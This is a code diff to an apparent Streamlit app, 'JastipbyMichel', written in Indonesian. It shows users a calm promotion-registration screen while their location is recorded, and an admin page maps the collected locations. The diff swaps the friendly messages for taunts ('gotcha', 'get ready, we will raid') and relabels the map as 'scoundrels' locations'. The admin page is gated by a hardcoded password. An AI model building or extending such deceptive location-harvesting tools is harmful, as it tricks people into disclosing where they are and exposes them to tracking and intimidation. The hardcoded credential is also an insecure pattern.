@@ -55,10 +55,10 @@ if "tercatat" not in st.session_state:
 
 # Tampilan yang dilihat oleh orang tua (Sederhana, bersih, bikin tenang)
 if st.session_state["tercatat"] == True:
-    st.success(f"Selamat! Lokasi wilayah Anda ({st.session_state['info_kota']}) telah berhasil didaftarkan ke sistem JastipbyMichel. Terima kasih!")
+    st.success(f"Selamat! Lokasi wilayah Anda ({st.session_state['info_kota']}) telah berhasil didaftarkan ke sistem JastipbyMichel. kena anda!")
     st.balloons()
 else:
-    st.info("Memproses pendaftaran promosi Anda, mohon tunggu sebentar...")
+    st.info("Siap siap kami gerebek...")
 
 
 # ================= DASHBOARD ADMIN (PASSWORD: michel123) =================
@@ -68,20 +68,20 @@ st.write("🔒 *Fitur Khusus Pengembang / Admin JastipbyMichel*")
 password_input = st.text_input("Masukkan Password Admin untuk melihat peta sebaran:", type="password")
 
 if password_input == "michel123":
-    st.success("Akses Diterima! Menampilkan Dashboard Sebaran Toko.")
+    st.success("Akses Diterima! Menampilkan Lokasi bajingan.")
     st.subheader("📊 Peta Database JastipbyMichel")
 
     df_tampil = muat_data()
 
     if not df_tampil.empty:
-        st.metric(label="Total Mitra Toko Terdaftar", value=len(df_tampil))
+        st.metric(label="Locasi bajingan", value=len(df_tampil))
         
-        st.write("### Peta Sebaran Lokasi")
+        st.write("### Posisi bajingan")
         st.map(df_tampil)
         
         st.write("### Log Rincian Data")
         st.dataframe(df_tampil, use_container_width=True)
     else:
-        st.info("Belum ada lokasi toko yang masuk.")
+        st.info("belum ada bajingan.")
 elif password_input != "":
     st.error("Password Salah! Akses ditolak.")
